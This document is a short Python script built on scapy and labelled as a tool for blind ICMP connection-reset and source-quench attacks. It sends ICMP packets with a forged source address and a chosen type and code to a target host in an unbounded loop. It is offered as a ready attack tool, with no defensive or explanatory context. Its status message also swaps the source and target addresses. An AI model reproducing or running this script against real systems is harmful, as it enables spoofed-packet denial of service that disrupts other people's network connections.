## Python script to perform blind ICMP Connection-RESET and Source-Quench Attacks locally

import sys
from scapy.all import *

interface = "eth0"
source = None
target = None
icmp_type = None
icmp_code = None

class SendICMP():
	global target, port
	def transfer(self):
		i = IP()
		i.src = source
		i.dst = target
		
		c = ICMP()
		c.type = icmp_type
		c.code = icmp_code
		send(i/c, verbose=0)

if __name__ == "__main__":
	#Check for all required arguments
	if len(sys.argv) != 5:
		print "Usage: %s <Source IP> <Target IP> <ICMP_Type> <ICMP_Code>" % sys.argv[0]
		exit()

	i=1
	source = sys.argv[1]	
	target = sys.argv[2]
	icmp_type = int(sys.argv[3])
	icmp_code = int(sys.argv[4])
	conf.iface = interface

	print "Sending from:%s to:%s an ICMP Packet with Type:Code %i:%i" % (target, source, icmp_type, icmp_code)
	
	while i:
		SendICMP().transfer()
